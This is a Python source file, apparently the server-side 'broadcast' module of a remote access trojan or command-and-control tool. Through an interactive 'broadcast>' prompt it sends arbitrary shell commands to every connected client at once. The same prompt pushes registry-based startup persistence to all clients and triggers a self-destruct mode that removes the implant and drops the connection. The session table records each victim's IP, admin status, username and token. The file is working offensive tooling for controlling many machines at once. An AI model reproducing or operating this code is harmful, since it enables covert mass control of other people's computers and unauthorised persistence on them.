from .handler import Handler

from .other import printColor
from .other import XOREncryption
from .other import areYouSure
from .other import printAllTarget
from .other import NB_SESSION , NB_SOCKET , NB_IP , NB_PORT , NB_ALIVE , NB_ADMIN , NB_PATH , NB_USERNAME , NB_TOKEN,NB_SELECT ,SOCK_TIMEOUT

from .management import CheckConn

class Broadcast:

    checker = True

    def __init__(self):
        Broadcast.checker = True #Resets the class attribute each time the constructor is called. 

    def help(self):
        '''-h or --help'''
        printColor("help","""
-h or --help : Displays all session mode commands.

-ls or --list : Displays all clients with their information.

-c : Executes a command on all clients and does not send the result (don't forget to put the command in quotation marks). 

-p or --persistence : Makes all clients persistent at startup by modifying the registry keys.

--destruction : Removes all clients on all clients and cuts connections.

-b or --back : Back to menu.
""") 

    def aSingleRunMod(self):
        '''
        Allows you not to send the same modes multiple times on the same machine. 
        This method is very useful for the destroy mode and persistence mode. 
        Once the test is finished it sends a list with all the sockets. 
        '''
        pass

        dict_sorts = {}
#Handler.dict_conn[Handler.number_conn] = [Handler.number_conn,self.conn, self.address[0], int(self.address[1]), True, info[0], info[1], info[2],info[3], False] #3 #True = Connexion is life 

        for key in Handler.dict_conn.keys():
            
            if(key == 0): #if first iteration
                dict_sorts[key] = [key,Handler.dict_conn[key][NB_SOCKET], Handler.dict_conn[key][NB_IP], Handler.dict_conn[key][NB_PORT]]
                print("--------->>>>",dict_sorts[key])
            
            else:
                
                for key2 in dict_sorts.keys(): #if doublon not add in dict
                    if(dict_sorts[key2][NB_IP] == Handler.dict_conn[key][NB_IP]):
                        print("ip doublon:")
                        print(dict_sorts[key2][0], "==", Handler.dict_conn[key][0])
                
                    else: #if not doublon add in dict:
                        dict_sorts[key] = [key,Handler.dict_conn[key][NB_SOCKET], Handler.dict_conn[key][NB_IP], Handler.dict_conn[key][NB_PORT]]
            
        print(dict_sorts)
        print(len(dict_sorts))         
        return dict_sorts
    
    def executeCommand(self,cmd_list):
        '''-c'''
       # print("-->",cmd_list)
        print("\n")
        cmd_list.pop(0) #delete "-c"
        
        tmp_cmd = " ".join(cmd_list) #list to string
        cmd = ""

        for char in tmp_cmd: 
            if(char == "\""): #remove "
                #print("char detect: ",char)
                pass
            elif(char == " "): #if space
               # print("space")
                cmd += " "
            else:
                cmd += char
        
        self.broadcast_to_all_clients(cmd) #send command for all client

    def destruction_for_all_clients(self):
        #Launches a process (.bat file) to delete the program and then exits the program. 
        printColor("information","\n[!] are you sure you want to run the destruction mode on all customers ? Once the destruction mode is activated, the clients will no longer be accessible.\nIf you are sure of your choice enter Y if not enter N.\n")

        if(areYouSure()):
            request = "MOD_DESTRUCTION:broadcast"
            print("\n")
            for key in Handler.dict_conn.keys():
                if(Handler.dict_conn[key][NB_ALIVE]):
                    if CheckConn().sendsafe(key,Handler.dict_conn[key][NB_SOCKET], request,False): 
                        printColor("information","[-] Client number {} {}:{} was disconnected.".format(Handler.dict_conn[key][NB_SESSION], Handler.dict_conn[key][NB_IP], Handler.dict_conn[key][NB_PORT]))
                        
                        try:
                            Handler.dict_conn[key][NB_SOCKET].close()
                        except:
                            pass

                        CheckConn().connexionIsDead(key) 

                    else:
                        printColor("information","[+] The command could not be sent to: {}:{}".format(Handler.dict_conn[key][NB_IP],Handler.dict_conn[key][NB_PORT]))
                else:
                    pass
        else:
            pass

    def disconnection_for_all_clients(self):
        pass

    def broadcast_to_all_clients(self, data, whitout_MOD_ALL=False): 
        '''
        Note:
        Sends an order to all clients. 
        whitout_MOD_ALL=False avoids additional code.
        When it sends persistence to all clients, it does not send "MOD_ALL". 
        With the "broadcast" argument of MOD_PERSISTENCE, the client does not send a response. It simply executes the persistence. 
        '''

        self.aSingleRunMod()
        
        request = ""

        if not(whitout_MOD_ALL): 
            request = "MOD_ALL:"+data
        else:
            request = data

        for key in Handler.dict_conn.keys():
            if(Handler.dict_conn[key][NB_ALIVE]):
                if CheckConn().sendsafe(key,Handler.dict_conn[key][NB_SOCKET], request):
                    printColor("information","[+] command sent to: {}:{}".format(Handler.dict_conn[key][NB_IP],Handler.dict_conn[key][NB_PORT]))
                else:
                    printColor("information","[+] The command could not be sent to: {}:{}".format(Handler.dict_conn[key][NB_IP],Handler.dict_conn[key][NB_PORT]))
            else:
                pass


    def main(self):
        if len(Handler.dict_conn) != 0:
            printColor("information","[?] You are in MOD BROADCAST")
            printColor("help","[?] Execute -b or --back to return to sessions mode.\n") 
            
            while Broadcast.checker:
                forall = str(input("broadcast>")).split()
                
                printColor("help","[?] Command execute: {}\n".format(forall))
                
                for i in range(len(forall)):
                    #print(i)
                    try:
                        if(forall[i] == "--back" or forall[i] == "-b"):
                            Broadcast.checker = False #Break Broadcast
                            break
                        
                        elif(forall[i] == "--help" or forall[i] == "-h"):
                            self.help()
                        
                        elif(forall[i] == "--destruction"):
                            self.destruction_for_all_clients()
                        
                        elif(forall[i] == "--persistence"):
                            self.broadcast_to_all_clients("MOD_PERSISTENCE:broadcast",True)
                        
                        elif(forall[i] == "-c"):
                            self.executeCommand(forall)
                        
                        elif(forall[i] == "-ls" or forall[i]=="--list"):
                            printAllTarget()                            

                        else:
                            pass

                    except IndexError:
                        pass


                print("\n")
        else:
            printColor("error","[+] No connection is enabled.\n")
        
        printColor("information", "[-] In MOD_MAIN\n")
